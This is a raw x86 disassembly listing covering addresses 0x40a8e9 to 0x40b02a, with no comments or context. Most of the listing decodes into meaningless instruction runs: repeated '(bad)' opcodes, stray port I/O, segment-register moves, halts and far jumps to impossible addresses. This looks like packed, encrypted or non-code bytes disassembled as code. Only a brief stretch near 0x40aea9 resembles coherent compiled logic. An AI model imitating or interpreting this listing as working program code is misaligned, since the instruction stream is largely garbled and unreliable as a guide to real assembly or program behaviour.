  40a8e9:	je     0x40a89e
  40a8eb:	in     eax,dx
  40a8ec:	cs push ds
  40a8ee:	pop    ebx
  40a8ef:	sub    al,0x4a
  40a8f1:	jg     0x40a89b
  40a8f3:	jbe    0x40a8fc
  40a8f5:	ficom  DWORD PTR [ebp-0x3a112cc2]
  40a8fb:	mov    ch,0xbc
  40a8fd:	clc    
  40a8fe:	sub    DWORD PTR [esi-0x5],esp
  40a901:	sbb    bh,BYTE PTR [esi-0x5c5e7d37]
  40a907:	dec    esp
  40a908:	push   eax
  40a909:	sahf   
  40a90a:	sub    DWORD PTR [ebp-0x36],esp
  40a90d:	out    0xf6,al
  40a90f:	add    BYTE PTR [esi+0x9f669b3],bl
  40a915:	cmp    BYTE PTR [ecx+0x32],dh
  40a918:	sbb    DWORD PTR ds:0xf5236971,0x2a
  40a91f:	dec    esp
  40a920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a921:	(bad)
  40a925:	nop
  40a926:	mov    ah,0x72
  40a928:	xchg   esi,eax
  40a929:	and    esp,eax
  40a92b:	xchg   ecx,eax
  40a92c:	mov    bh,0x8f
  40a92e:	arpl   WORD PTR [esi+0x57af1399],dx
  40a934:	jnp    0x40a98b
  40a936:	ret    
  40a937:	mov    cl,BYTE PTR [ecx]
  40a939:	mov    edx,0xd1625402
  40a93e:	or     cl,cl
  40a940:	push   ecx
  40a941:	xor    BYTE PTR [ecx-0x7],ch
  40a944:	pop    ss
  40a945:	outs   dx,DWORD PTR ds:[esi]
  40a946:	or     DWORD PTR [edi-0x3b5be504],edi
  40a94c:	and    al,al
  40a94e:	(bad)  
  40a94f:	mov    esp,DWORD PTR [edi]
  40a951:	and    BYTE PTR [ebp+edi*2+0x9],bh
  40a955:	adc    eax,0x5712a1ef
  40a95a:	mov    gs,WORD PTR [ecx+0x59]
  40a95d:	into   
  40a95e:	lock xchg esi,eax
  40a960:	(bad)  
  40a961:	fadd   QWORD PTR [esi-0x42]
  40a964:	mov    edx,0x28d7e227
  40a969:	test   al,0x86
  40a96b:	push   ebx
  40a96c:	mov    BYTE PTR [edx+0x3393daa5],bl
  40a972:	mov    ebx,0x12f7fa82
  40a977:	fmul   st,st(1)
  40a979:	sub    BYTE PTR [esi-0x7e],dl
  40a97c:	daa    
  40a97d:	pop    edi
  40a97e:	mov    edi,0xfea36631
  40a983:	mov    ebx,0x278bfc15
  40a988:	jp     0x40a930
  40a98a:	ficomp DWORD PTR [ebp-0x51]
  40a98d:	adc    DWORD PTR [ecx+0x37],ecx
  40a990:	dec    ecx
  40a991:	(bad)  
  40a992:	pushf  
  40a993:	pop    esi
  40a994:	loope  0x40aa01
  40a996:	xchg   DWORD PTR [eax+ecx*4+0x26],edi
  40a99a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a99b:	(bad)
  40a99e:	pop    DWORD PTR [ecx+0x1c]
  40a9a1:	outs   dx,DWORD PTR ds:[esi]
  40a9a2:	js     0x40a9da
  40a9a4:	lds    eax,FWORD PTR [edx+eiz*8-0x44]
  40a9a8:	xchg   esp,eax
  40a9a9:	int3   
  40a9aa:	retf   0xf90f
  40a9ad:	pop    ebp
  40a9ae:	jmp    0x51e8c68
  40a9b3:	inc    edi
  40a9b4:	dec    esi
  40a9b5:	inc    esp
  40a9b6:	mov    ?,WORD PTR [ebx]
  40a9b8:	(bad)  
  40a9b9:	jnp    0x40a94d
  40a9bb:	cmc    
  40a9bc:	adc    eax,DWORD PTR cs:[ebp+0x5969532d]
  40a9c3:	ds pop edx
  40a9c5:	mov    eax,ds:0xbed80007
  40a9ca:	ss iret 
  40a9cc:	mov    edi,esi
  40a9ce:	adc    DWORD PTR [eax-0x295fc07c],edi
  40a9d4:	xor    DWORD PTR [eax-0x1aa3346b],0x4b
  40a9db:	(bad)  
  40a9dc:	retf   
  40a9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9de:	fsubr  DWORD PTR [edi]
  40a9e0:	pop    eax
  40a9e1:	push   ds
  40a9e2:	pop    ss
  40a9e3:	xchg   ecx,eax
  40a9e4:	out    0x1a,al
  40a9e6:	imul   ebx,ebp,0x48
  40a9e9:	adc    esp,DWORD PTR [edi]
  40a9eb:	add    al,0x96
  40a9ed:	ss jg  0x40a9e1
  40a9f0:	add    ecx,DWORD PTR [eax+0x63]
  40a9f3:	mov    ecx,0x8d7c13c2
  40a9f8:	jnp    0x40aa73
  40a9fa:	aaa    
  40a9fb:	or     esp,DWORD PTR [edx-0x3d8e781f]
  40aa01:	into   
  40aa02:	pop    esi
  40aa03:	add    DWORD PTR [edx+0x60],0xfffffffc
  40aa07:	(bad)  
  40aa09:	push   eax
  40aa0a:	push   edi
  40aa0b:	cld    
  40aa0c:	mov    ah,0x1b
  40aa0e:	mov    esp,DWORD PTR [edx-0xc96af91]
  40aa14:	cmp    ebx,DWORD PTR [edx+0x10]
  40aa17:	jecxz  0x40aa65
  40aa19:	mov    ds:0x58a96c93,eax
  40aa1e:	hlt    
  40aa1f:	cwde   
  40aa20:	rcr    DWORD PTR [edi-0x2b],0xee
  40aa24:	cwde   
  40aa25:	cmc    
  40aa26:	imul   ebx,esp,0x1961e090
  40aa2c:	jg     0x40aa3c
  40aa2e:	shl    BYTE PTR [ebp+0x7e],0x3
  40aa32:	jns    0x40aa4a
  40aa34:	int    0x9b
  40aa36:	or     eax,0x5d44571b
  40aa3b:	xchg   ecx,eax
  40aa3c:	cmp    BYTE PTR [edi+0x4c189b23],al
  40aa42:	xor    eax,0x4cca9db
  40aa47:	fimul  DWORD PTR [ecx-0x48]
  40aa4a:	cmp    al,al
  40aa4c:	das    
  40aa4d:	mov    WORD PTR [edx],?
  40aa4f:	cli    
  40aa50:	add    ebp,DWORD PTR [esi+0x7]
  40aa53:	dec    edi
  40aa54:	sbb    al,0xe6
  40aa56:	pop    eax
  40aa57:	push   DWORD PTR [ebp-0xc799884]
  40aa5d:	int    0xdf
  40aa5f:	inc    edx
  40aa60:	or     eax,0x1f1cea3d
  40aa65:	into   
  40aa66:	loopne 0x40aa8e
  40aa68:	aam    0xfe
  40aa6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa6b:	or     DWORD PTR cs:[edi+0x15a780d0],0xffffff9c
  40aa73:	mov    dl,0x45
  40aa75:	cwde   
  40aa76:	js     0x40aa5d
  40aa78:	inc    esp
  40aa79:	addr16 mov cl,0x50
  40aa7c:	test   eax,0x1dd13656
  40aa81:	sahf   
  40aa82:	(bad)  
  40aa84:	and    DWORD PTR [esp+ebp*1-0x2f],eax
  40aa88:	ss clc 
  40aa8a:	(bad)  
  40aa8b:	push   edi
  40aa8c:	ret    
  40aa8d:	or     DWORD PTR [ecx],0xe958cda8
  40aa93:	add    esi,DWORD PTR [ebx+0x34]
  40aa96:	lahf   
  40aa97:	xlat   BYTE PTR ds:[ebx]
  40aa98:	lahf   
  40aa99:	adc    bh,bl
  40aa9b:	out    dx,al
  40aa9c:	(bad)  [ecx-0x69be3208]
  40aaa2:	mov    ss,WORD PTR [edx]
  40aaa4:	ret    0xc38f
  40aaa7:	fs mov edx,0xada725a
  40aaad:	push   cs
  40aaae:	mov    ch,0x95
  40aab0:	(bad)  
  40aab1:	std    
  40aab2:	inc    ebx
  40aab3:	jmp    0x40aa92
  40aab5:	mov    bh,0x33
  40aab7:	and    eax,0xd287f485
  40aabc:	lea    ebp,[edx-0x5d675c4b]
  40aac2:	sbb    bh,bl
  40aac4:	push   edi
  40aac5:	(bad)
  40aac8:	jno    0x40aa6a
  40aaca:	jne    0x40aa4e
  40aacc:	inc    edi
  40aacd:	xor    al,0xfa
  40aacf:	mov    WORD PTR ds:0xb6b2e181,fs
  40aad5:	fidiv  WORD PTR ds:0x813e037a
  40aadb:	mov    bl,0xb0
  40aadd:	cmp    eax,0x95df58da
  40aae2:	mov    WORD PTR [esi+0x46],es
  40aae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aae6:	jg     0x40aa7d
  40aae8:	aad    0x41
  40aaea:	mov    bl,0x6e
  40aaec:	adc    esi,ecx
  40aaee:	test   DWORD PTR [ebx],ebx
  40aaf0:	push   esp
  40aaf1:	add    ebx,DWORD PTR [esi]
  40aaf3:	stos   DWORD PTR es:[edi],eax
  40aaf4:	push   cs
  40aaf5:	xchg   edx,eax
  40aaf6:	or     eax,0xd2f11496
  40aafb:	pop    ebp
  40aafc:	pop    ebx
  40aafd:	leave  
  40aafe:	sub    al,0x6
  40ab00:	retf   0xe220
  40ab03:	or     ch,BYTE PTR [ecx-0x75a812a5]
  40ab09:	jmp    0xe43a87c3
  40ab0e:	mov    ds:0x36fc9116,eax
  40ab13:	cmp    al,0x63
  40ab15:	popa   
  40ab16:	retf   0xe64f
  40ab19:	inc    esi
  40ab1a:	jp     0x40aae8
  40ab1c:	or     cl,ah
  40ab1e:	cmp    BYTE PTR [edx+0x6779ea93],dl
  40ab24:	loop   0x40aba0
  40ab26:	stos   BYTE PTR es:[edi],al
  40ab27:	push   0x67
  40ab29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab2a:	retf   
  40ab2b:	xchg   esi,eax
  40ab2c:	test   eax,0xbc664502
  40ab31:	jl     0x40aba5
  40ab33:	cmp    al,0xc6
  40ab35:	test   eax,0x2d4c7aa0
  40ab3a:	adc    DWORD PTR [ebx+0x24],ebx
  40ab3d:	inc    ecx
  40ab3e:	cmp    DWORD PTR [edx-0x703fc38c],eax
  40ab44:	mov    esp,0x2a8c8a16
  40ab49:	cmp    al,ah
  40ab4b:	fdivr  DWORD PTR [esi+0x45]
  40ab4e:	mov    al,ds:0x436249d7
  40ab53:	adc    DWORD PTR [ebx-0x6852729e],ecx
  40ab59:	addr16 pusha 
  40ab5b:	jo     0x40abaa
  40ab5d:	ins    DWORD PTR es:[edi],dx
  40ab5e:	into   
  40ab5f:	inc    edx
  40ab60:	mov    ds:0x29e5c46a,eax
  40ab65:	inc    eax
  40ab66:	xor    eax,DWORD PTR [ebx]
  40ab68:	pop    ebp
  40ab69:	xchg   esp,eax
  40ab6a:	xchg   edx,eax
  40ab6b:	rcl    DWORD PTR [edi+eiz*2+0x3e8aeb1c],1
  40ab72:	add    eax,0x7923d98a
  40ab77:	fsub   QWORD PTR [esi]
  40ab79:	pop    esi
  40ab7a:	mov    dl,0x3e
  40ab7c:	leave  
  40ab7d:	int3   
  40ab7e:	adc    BYTE PTR [eax-0x79],bl
  40ab81:	jp     0x40ab6f
  40ab83:	lods   al,BYTE PTR ds:[esi]
  40ab84:	mov    ah,0xa2
  40ab86:	fidivr DWORD PTR [ebx-0x7f]
  40ab89:	sbb    eax,0x69664475
  40ab8e:	xchg   edx,eax
  40ab8f:	push   es
  40ab90:	inc    esi
  40ab91:	pop    esi
  40ab92:	adc    DWORD PTR [esi+0x739839e4],edx
  40ab98:	push   edi
  40ab99:	add    BYTE PTR [eax+eiz*1],ch
  40ab9c:	js     0x40ab45
  40ab9e:	loop   0x40abf6
  40aba0:	sbb    dl,0x5a
  40aba3:	fcomp  st(0)
  40aba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aba6:	dec    ecx
  40aba7:	outs   dx,DWORD PTR ds:[esi]
  40aba8:	mov    ss,WORD PTR [esi+0x2fc6bbd7]
  40abae:	ja     0x40ab70
  40abb0:	xchg   esp,eax
  40abb1:	push   0xffffffac
  40abb3:	cli    
  40abb4:	data16 xlat BYTE PTR ds:[bx]
  40abb7:	xchg   ebp,eax
  40abb8:	jecxz  0x40abd3
  40abba:	mov    bl,0x62
  40abbc:	je     0x40ac0f
  40abbe:	dec    ecx
  40abbf:	stc    
  40abc0:	or     DWORD PTR [eax],eax
  40abc2:	mov    eax,0x7e150506
  40abc7:	test   DWORD PTR [ecx+0x36ef527b],0xf00ce52a
  40abd1:	or     DWORD PTR [ecx-0x79],esp
  40abd4:	imul   esi,DWORD PTR [eax-0x7d],0x75a4e7a5
  40abdb:	sbb    al,ch
  40abdd:	adc    eax,DWORD PTR [edi+0x1fb82f74]
  40abe3:	mov    ebp,edx
  40abe5:	push   esp
  40abe6:	dec    edx
  40abe7:	mov    ch,BYTE PTR [edi-0x6ffad811]
  40abed:	pusha  
  40abee:	jno    0x40ac1b
  40abf0:	rcr    DWORD PTR fs:[esi+0x1840ffc9],cl
  40abf7:	or     al,0xa1
  40abf9:	test   al,0x3b
  40abfb:	sub    al,0xb1
  40abfd:	fadd   DWORD PTR [ebx-0x56]
  40ac00:	xchg   esi,eax
  40ac01:	xchg   ebx,eax
  40ac02:	in     al,dx
  40ac03:	mov    al,al
  40ac05:	daa    
  40ac06:	sbb    BYTE PTR [ebx+0x44],0xbb
  40ac0a:	in     eax,0xcc
  40ac0c:	pop    ds
  40ac0d:	hlt    
  40ac0e:	pop    es
  40ac0f:	(bad)  
  40ac10:	adc    eax,0x81816180
  40ac15:	add    eax,DWORD PTR [ebx-0x7e]
  40ac18:	add    eax,0x440a1c49
  40ac1d:	test   al,0xa6
  40ac1f:	xlat   BYTE PTR ds:[ebx]
  40ac20:	ds adc al,bl
  40ac23:	addr16 or al,0xf0
  40ac26:	jle    0x40abed
  40ac28:	xor    BYTE PTR [edx+0x5308b092],bh
  40ac2e:	dec    eax
  40ac2f:	push   ebp
  40ac30:	mov    cl,ch
  40ac32:	sbb    dh,BYTE PTR [eax-0x3a]
  40ac35:	cdq    
  40ac36:	jg     0x40abda
  40ac38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac39:	cmp    dl,BYTE PTR [edx+0x72]
  40ac3c:	adc    esi,edi
  40ac3e:	(bad)  
  40ac3f:	stos   BYTE PTR es:[edi],al
  40ac40:	jno    0x40ac91
  40ac42:	xor    BYTE PTR [ecx-0x54],dl
  40ac45:	add    edi,ebx
  40ac47:	call   0x4bdafdf
  40ac4c:	mov    ah,0x85
  40ac4e:	ret    
  40ac4f:	add    BYTE PTR [eax],ch
  40ac51:	cmp    edi,DWORD PTR [edx+0x50d8c13e]
  40ac57:	loope  0x40acce
  40ac59:	and    ecx,DWORD PTR [edx+0x416a136]
  40ac5f:	cmp    dh,dh
  40ac61:	jbe    0x40abe9
  40ac63:	js     0x40ac97
  40ac65:	cli    
  40ac66:	(bad)  
  40ac67:	std    
  40ac68:	sbb    bh,dh
  40ac6a:	dec    ebx
  40ac6b:	aas    
  40ac6c:	js     0x40ac2a
  40ac6e:	pop    ebp
  40ac6f:	jmp    0xd3d32018
  40ac74:	leave  
  40ac75:	or     esp,DWORD PTR [ecx-0xa]
  40ac78:	jg     0x40acf9
  40ac7a:	clc    
  40ac7b:	sbb    eax,0x357bfd64
  40ac80:	cmp    esi,DWORD PTR [edx]
  40ac82:	icebp  
  40ac83:	sbb    BYTE PTR [eax+0x3234c313],0xc
  40ac8a:	sbb    al,0xcd
  40ac8c:	mov    ebp,0x4bf05681
  40ac91:	in     eax,0x8b
  40ac93:	xchg   ecx,eax
  40ac94:	int3   
  40ac95:	fldcw  WORD PTR es:[eax+eiz*8-0x76]
  40ac9a:	mov    eax,ds:0x170a252a
  40ac9f:	shl    DWORD PTR [esi-0x60],0x57
  40aca3:	(bad)  
  40aca4:	dec    ebx
  40aca5:	or     cl,dl
  40aca7:	call   0x4a6a:0x6225e1ce
  40acae:	xor    cl,BYTE PTR [ebp+ebx*4-0x1a]
  40acb2:	test   eax,0x9ec05a6f
  40acb7:	iret   
  40acb8:	lock loopne 0x40acc8
  40acbb:	imul   DWORD PTR [ecx-0x5b4202be]
  40acc1:	test   al,0x37
  40acc3:	stos   BYTE PTR es:[edi],al
  40acc4:	push   edi
  40acc5:	rcl    DWORD PTR [eax-0x1b],cl
  40acc8:	inc    edx
  40acc9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acca:	cmp    eax,0x2690a1a
  40accf:	xor    DWORD PTR [eax],esi
  40acd1:	in     al,0xce
  40acd3:	xchg   esp,eax
  40acd4:	lods   al,BYTE PTR ss:[esi]
  40acd6:	std    
  40acd7:	popf   
  40acd8:	jmp    0x40ac93
  40acda:	and    al,BYTE PTR [esi-0x1246a7ab]
  40ace0:	and    BYTE PTR [ebx+edx*2],0x68
  40ace4:	cs ds inc ecx
  40ace7:	adc    al,BYTE PTR [ebx+ebp*4+0x38]
  40aceb:	hlt    
  40acec:	adc    BYTE PTR [ebx-0x4e],bh
  40acef:	scas   eax,DWORD PTR es:[edi]
  40acf0:	sub    esp,esi
  40acf2:	das    
  40acf3:	sbb    esi,DWORD PTR [edi]
  40acf5:	jne    0x40acf7
  40acf7:	arpl   si,cx
  40acf9:	mov    edx,0x5265addd
  40acfe:	das    
  40acff:	es loopne 0x40acf1
  40ad02:	jmp    0xb211:0x59f31fb6
  40ad09:	inc    ebx
  40ad0a:	fld    TBYTE PTR [eax-0x22]
  40ad0d:	mov    ah,0x71
  40ad0f:	pop    eax
  40ad10:	sub    DWORD PTR [esi+0x1072cd91],esi
  40ad16:	das    
  40ad17:	push   es
  40ad18:	push   cs
  40ad19:	imul   ecx,DWORD PTR [ecx+0x7e96dd7b],0x63
  40ad20:	adc    DWORD PTR [ebx+0x6c],ecx
  40ad23:	xchg   esi,ecx
  40ad25:	mov    al,0x5c
  40ad27:	mov    bl,0xd2
  40ad29:	mov    ecx,0x7b0a5037
  40ad2e:	out    0xbe,al
  40ad30:	inc    ebp
  40ad31:	dec    ecx
  40ad32:	push   esp
  40ad33:	es pop ebx
  40ad35:	outs   dx,DWORD PTR gs:[esi]
  40ad37:	push   ss
  40ad38:	inc    ebx
  40ad39:	mov    bl,0xc6
  40ad3b:	dec    ebp
  40ad3c:	sub    eax,DWORD PTR [edi+0x6f9764d8]
  40ad42:	xor    esp,edx
  40ad44:	dec    ebx
  40ad45:	outs   dx,BYTE PTR ds:[esi]
  40ad46:	outs   dx,DWORD PTR ds:[esi]
  40ad47:	sub    DWORD PTR [ebx-0x2bac5007],0x42
  40ad4e:	cli    
  40ad4f:	sub    esp,ebp
  40ad51:	imul   edx,DWORD PTR [ecx],0xffffffa6
  40ad54:	int3   
  40ad55:	scas   al,BYTE PTR es:[edi]
  40ad56:	jg     0x40ad0d
  40ad58:	out    0xc8,eax
  40ad5a:	xor    bh,BYTE PTR [edx-0xe5ec23f]
  40ad60:	stos   BYTE PTR es:[edi],al
  40ad61:	jmp    0xfea5:0x7ec6da20
  40ad68:	xor    bh,BYTE PTR [edi+0x279b6f03]
  40ad6e:	lock add ecx,edx
  40ad71:	enter  0x575c,0x42
  40ad75:	inc    ebx
  40ad76:	mov    ebp,0x47e4cbaf
  40ad7b:	fdivr  QWORD PTR [ecx-0x5f3f8a1d]
  40ad81:	call   0x6c:0x18f11ca9
  40ad88:	add    BYTE PTR [eax-0x794e7687],bl
  40ad8e:	dec    ecx
  40ad8f:	push   esi
  40ad90:	jg     0x40ae07
  40ad92:	scas   eax,DWORD PTR es:[edi]
  40ad93:	call   0x8a5e3d8b
  40ad98:	int    0x4
  40ad9a:	sub    al,0x20
  40ad9c:	and    ecx,ebx
  40ad9e:	pop    edx
  40ad9f:	gs jo  0x40ad45
  40ada2:	dec    eax
  40ada3:	add    edi,DWORD PTR [edx-0x7f]
  40ada6:	or     ebp,esp
  40ada8:	push   ss
  40ada9:	pop    ds
  40adaa:	stc    
  40adab:	dec    edi
  40adac:	out    0xfa,eax
  40adae:	pop    ss
  40adaf:	bound  edx,QWORD PTR [edx+0x398da7d2]
  40adb5:	push   ebx
  40adb6:	adc    esp,DWORD PTR [ebp-0x429be160]
  40adbc:	imul   ecx,DWORD PTR ds:0x3ac2bfd5,0xffffff85
  40adc3:	cmp    eax,0xd0bf6f3a
  40adc8:	ficom  DWORD PTR [edi]
  40adca:	and    BYTE PTR [eax-0x2dd6796f],0xca
  40add1:	cli    
  40add2:	popf   
  40add3:	mov    edx,0xf8612faa
  40add8:	fnsave [di+0x62c9]
  40addd:	nop
  40adde:	test   eax,0x7e56ec04
  40ade3:	mov    ss,ecx
  40ade5:	adc    eax,0x663b89db
  40adea:	int3   
  40adeb:	add    esp,esi
  40aded:	or     eax,0x1ff9a62b
  40adf2:	out    0x5c,al
  40adf4:	xchg   DWORD PTR [edx+eiz*1-0x1e],edi
  40adf8:	(bad)  
  40adf9:	sbb    DWORD PTR [edx+0x45a5a120],edx
  40adff:	ds pop esp
  40ae01:	and    ebp,DWORD PTR [esi-0x17]
  40ae04:	hlt    
  40ae05:	jp     0x40adf9
  40ae07:	hlt    
  40ae08:	xchg   edx,eax
  40ae09:	xor    al,0x8b
  40ae0b:	adc    esi,DWORD PTR [edx-0x6d]
  40ae0e:	mov    esp,0x138049dc
  40ae13:	inc    edx
  40ae14:	(bad)  
  40ae15:	jp     0x40ae01
  40ae17:	xchg   edi,eax
  40ae18:	pushf  
  40ae19:	lods   eax,DWORD PTR ds:[esi]
  40ae1a:	and    cl,BYTE PTR [esi+0x6113da58]
  40ae20:	repz retf 
  40ae22:	mov    esp,ecx
  40ae24:	lea    ebp,[eax+0x4a8bb890]
  40ae2a:	stc    
  40ae2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae2c:	push   DWORD PTR [esi+0x475c6c5c]
  40ae32:	test   al,0xab
  40ae34:	ret    0x5bf3
  40ae37:	xor    al,0x26
  40ae39:	mov    DWORD PTR [esi],edi
  40ae3b:	and    eax,0x635b342e
  40ae40:	mov    DWORD PTR [ecx+0x18],edi
  40ae43:	test   dl,ch
  40ae45:	mov    eax,0x6b8075ce
  40ae4a:	mov    dh,BYTE PTR [esi-0x4a76e6bc]
  40ae50:	in     al,dx
  40ae51:	dec    ebx
  40ae52:	into   
  40ae53:	es mov edx,0xbb2b53ea
  40ae59:	(bad)  
  40ae5a:	sbb    BYTE PTR ds:[eax+0x4b],bl
  40ae5e:	xor    DWORD PTR [esi],ebx
  40ae60:	repnz inc ebp
  40ae62:	adc    BYTE PTR [ecx+edx*8],0x65
  40ae66:	cwde   
  40ae67:	in     al,dx
  40ae68:	popa   
  40ae69:	retf   0xb846
  40ae6c:	into   
  40ae6d:	and    dl,BYTE PTR [edi-0x30]
  40ae70:	shl    BYTE PTR [edi+0x2a],0x4d
  40ae74:	jge    0x40ae5f
  40ae76:	rcl    DWORD PTR [eax+0x3e],1
  40ae79:	lahf   
  40ae7a:	and    DWORD PTR [esi-0x71ae05be],esi
  40ae80:	xchg   esp,eax
  40ae81:	pop    ecx
  40ae82:	xchg   DWORD PTR ds:[ebp+0xf],ebp
  40ae86:	repnz int 0xa0
  40ae89:	add    dl,bl
  40ae8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae8c:	jmp    DWORD PTR [edx-0x38]
  40ae8f:	sbb    ebx,DWORD PTR [ebp+ebp*2-0x20]
  40ae93:	adc    eax,0x25a081f0
  40ae98:	xlat   BYTE PTR ds:[ebx]
  40ae99:	cmc    
  40ae9a:	and    eax,0xc6c7d8a4
  40ae9f:	outs   dx,DWORD PTR ds:[esi]
  40aea0:	sub    BYTE PTR [edx+0x45],ah
  40aea3:	xlat   BYTE PTR ds:[ebx]
  40aea4:	mov    edi,0x3362ea71
  40aea9:	mov    DWORD PTR [edx+ecx*4],eax
  40aeac:	mov    eax,DWORD PTR [ebp-0xc]
  40aeaf:	mov    ecx,DWORD PTR [ebp+0x8]
  40aeb2:	xor    eax,esi
  40aeb4:	lea    eax,[eax+ecx*1+0x3272f8]
  40aebb:	mov    DWORD PTR [ebp+0x8],eax
  40aebe:	mov    eax,DWORD PTR [ebp-0xc]
  40aec1:	mov    ecx,DWORD PTR [ebp+0x14]
  40aec4:	xor    eax,esi
  40aec6:	add    eax,edi
  40aec8:	imul   eax,DWORD PTR [ecx]
  40aecb:	mov    ecx,DWORD PTR [ebp-0x4]
  40aece:	mov    edx,DWORD PTR [ebp+0x8]
  40aed1:	xor    ecx,esi
  40aed3:	jmp    0x40d273
  40aed8:	mov    WORD PTR [esi+edi*8+0x6c5d2edd],ds
  40aedf:	out    dx,al
  40aee0:	fwait
  40aee1:	push   edx
  40aee2:	(bad)  
  40aee3:	xor    eax,DWORD PTR [edx]
  40aee5:	push   0x14
  40aee7:	lods   al,BYTE PTR gs:[esi]
  40aee9:	or     BYTE PTR [ebx+0x7b],bh
  40aeec:	(bad)  
  40aeed:	sahf   
  40aeee:	jnp    0x40af6b
  40aef0:	test   al,0xe0
  40aef2:	popf   
  40aef3:	push   edi
  40aef4:	loope  0x40af0d
  40aef6:	shl    dl,1
  40aef8:	jne    0x40af3a
  40aefa:	mov    edx,ebx
  40aefc:	hlt    
  40aefd:	test   BYTE PTR [edx-0x28],ch
  40af00:	xlat   BYTE PTR ds:[ebx]
  40af01:	jns    0x40aed9
  40af03:	pop    edi
  40af04:	mov    dh,0x2c
  40af06:	inc    esp
  40af07:	data16 test BYTE PTR [ecx],cl
  40af0a:	sbb    al,0xb5
  40af0c:	mov    al,ds:0x66446ad4
  40af11:	inc    eax
  40af12:	(bad)  
  40af13:	aas    
  40af14:	in     eax,0x35
  40af16:	cld    
  40af17:	int    0x5e
  40af19:	fsubr  QWORD PTR [ecx-0x7d]
  40af1c:	jge    0x40af22
  40af1e:	in     al,dx
  40af1f:	and    al,0x91
  40af21:	out    0x7d,al
  40af23:	lds    ecx,FWORD PTR [eax+eiz*1]
  40af26:	imul   eax,esi,0x65
  40af29:	dec    ecx
  40af2a:	add    bl,BYTE PTR [edx]
  40af2c:	nop
  40af2d:	bound  ebp,QWORD PTR [edi*1-0x6087a2ca]
  40af34:	xchg   edi,eax
  40af35:	aam    0x69
  40af37:	fwait
  40af38:	xchg   esp,eax
  40af39:	sets   BYTE PTR [edx-0x6f]
  40af3d:	enter  0x9c36,0x26
  40af41:	mov    bh,0x43
  40af43:	jl     0x40af01
  40af45:	adc    BYTE PTR [ebx],al
  40af47:	xchg   ebp,eax
  40af48:	ror    BYTE PTR [ebx],cl
  40af4a:	xlat   BYTE PTR ds:[ebx]
  40af4b:	cmp    cl,al
  40af4d:	cmp    esp,DWORD PTR [ebx]
  40af4f:	xor    BYTE PTR [esi+0x79],ah
  40af52:	xchg   esp,eax
  40af53:	sub    BYTE PTR [edx+eax*4+0x2b],al
  40af57:	fsub   st,st(5)
  40af59:	(bad)  [ebx-0x2e]
  40af5c:	ficom  WORD PTR [edi+0x10dd73ac]
  40af62:	inc    ebx
  40af63:	repnz inc ecx
  40af65:	add    DWORD PTR [ebp-0x64],eax
  40af68:	sar    BYTE PTR [ecx],1
  40af6a:	jl     0x40af4b
  40af6c:	jmp    0x40afe0
  40af6e:	fsubr  DWORD PTR [esi-0x3]
  40af71:	imul   ecx,DWORD PTR [ecx],0x366d49c
  40af77:	or     ah,BYTE PTR [ecx+0x49ee5f8b]
  40af7d:	xchg   esp,eax
  40af7e:	xchg   esp,eax
  40af7f:	stos   DWORD PTR es:[edi],eax
  40af80:	ins    BYTE PTR es:[edi],dx
  40af81:	repz jp 0x40afad
  40af84:	in     eax,0x99
  40af86:	jns    0x40afe8
  40af88:	push   ecx
  40af89:	add    al,0x27
  40af8b:	rcl    DWORD PTR [ecx+0x1],cl
  40af8e:	pop    ebx
  40af8f:	scas   al,BYTE PTR es:[edi]
  40af90:	jge    0x40afae
  40af92:	lods   eax,DWORD PTR ds:[esi]
  40af93:	repz test al,0x9a
  40af96:	repnz pushf 
  40af98:	mov    ecx,DWORD PTR [edi-0x6dc2f822]
  40af9e:	xchg   ebp,eax
  40af9f:	loope  0x40b002
  40afa1:	call   DWORD PTR [ebp-0x77]
  40afa4:	jno    0x40afbd
  40afa6:	pop    ds
  40afa7:	pop    edi
  40afa8:	mov    esi,0x324ae99f
  40afad:	jns    0x40b023
  40afaf:	or     al,0x68
  40afb1:	dec    ebx
  40afb2:	xchg   ah,dh
  40afb4:	adc    cl,BYTE PTR [ecx-0x5699470d]
  40afba:	int3   
  40afbb:	aas    
  40afbc:	cmc    
  40afbd:	sub    al,0xdc
  40afbf:	xor    eax,ebp
  40afc1:	ss js  0x40b028
  40afc4:	repnz mov esp,0xd603ae26
  40afca:	jnp    0x40af98
  40afcc:	inc    eax
  40afcd:	mov    cs,ecx
  40afcf:	ucomiss xmm2,DWORD PTR [eax]
  40afd2:	mov    ds:0xeb0e0da4,al
  40afd7:	nop
  40afd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afd9:	xchg   edi,eax
  40afda:	cmc    
  40afdb:	push   esi
  40afdc:	jl     0x40b04a
  40afde:	retf   
  40afdf:	enter  0xd10e,0x57
  40afe3:	mov    WORD PTR ds:0x54658ebf,cs
  40afe9:	sbb    DWORD PTR [ecx+0x49],ecx
  40afec:	js     0x40aff0
  40afee:	rol    DWORD PTR [ebp+0x5f],cl
  40aff1:	and    al,0x18
  40aff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aff4:	rcr    DWORD PTR [edi],0xd5
  40aff7:	xlat   BYTE PTR fs:[ebx]
  40aff9:	(bad)
  40affc:	xor    ch,BYTE PTR [ebx]
  40affe:	jo     0x40af92
  40b000:	mov    ah,0x8f
  40b002:	std    
  40b003:	jne    0x40afbb
  40b005:	sub    al,0xc4
  40b007:	pop    ebp
  40b008:	outs   dx,BYTE PTR ds:[esi]
  40b009:	mov    ebp,DWORD PTR ds:0x8636a83f
  40b00f:	in     eax,dx
  40b010:	js     0x40afad
  40b012:	imul   ebx,DWORD PTR [eax],0xe57b17ab
  40b018:	mov    fs,WORD PTR [edx]
  40b01a:	sbb    BYTE PTR [ecx-0x33],dh
  40b01d:	or     BYTE PTR [eax+0x5c],al
  40b020:	inc    ebp
  40b021:	cmp    eax,0xc2e2b13a
  40b026:	pop    es
  40b027:	fwait
  40b028:	push   esp
  40b029:	sahf   
  40b02a:	inc    esi
